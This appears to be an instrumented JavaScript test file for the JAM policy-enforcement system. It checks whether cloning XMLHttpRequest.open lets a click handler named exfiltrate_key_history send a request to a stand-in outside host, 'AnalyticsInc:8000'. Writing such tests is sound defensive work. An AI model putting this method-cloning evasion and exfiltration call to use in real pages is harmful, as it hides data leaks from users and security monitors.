// exfil_test_clone.js
function clone(obj$$16) {
  var v11 = obj$$16 == null;
  if (!v11) {
    v11 = typeof obj$$16 != "object";
  }
  if (v11) {
    return obj$$16;
  }
  var temp = {};
  var key$$14;
  for (key$$14 in obj$$16) {
    var v1 = temp;
    var v2 = key$$14;
    introspect(JAM.policy.p1) {
      var v12 = obj$$16[key$$14]
    }
    var v28 = clone(v12);
    JAM.set(v1, v2, v28);
  }
  return temp;
}
function clone2(obj$$17) {
  if (obj$$17.cloneNode) {
    return obj$$17.cloneNode(true);
  }
  var v4;
  if (obj$$17 instanceof Array) {
    v4 = [];
  } else {
    v4 = {};
  }
  var copy = v4;
  var attr;
  for (attr in obj$$17) {
    introspect(JAM.policy.p1) {
      var v27 = obj$$17[attr]
    }
    var v20 = typeof v27 == "function";
    if (!v20) {
      introspect(JAM.policy.p1) {
        var v24 = obj$$17[attr]
      }
      v20 = v24 == null;
    }
    var v14 = v20;
    if (!v14) {
      introspect(JAM.policy.p1) {
        var v26 = obj$$17[attr]
      }
      v14 = !v26.clone2;
    }
    if (v14) {
      JAM.set(copy, attr, JAM.get(obj$$17, attr, JAM.policy.p1));
    } else {
      introspect(JAM.policy.p1) {
        var v15 = obj$$17[attr]
      }
      if (v15 == obj$$17) {
        JAM.set(copy, attr, copy);
      } else {
        var v5 = copy;
        var v6 = attr;
        introspect(JAM.policy.p1) {
          var v16 = obj$$17[attr]
        }
        var v29 = v16.clone2();
        JAM.set(v5, v6, v29);
      }
    }
  }
  return copy;
}
function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  var v9 = xmlhttp;
  introspect(JAM.policy.p1) {
    var v17 = xmlhttp.open
  }
  var v30 = clone(v17);
  v9.opennew = v30;
  JAM.call(xmlhttp.opennew, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=clone1", true]);
  xmlhttp.send(null);
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)

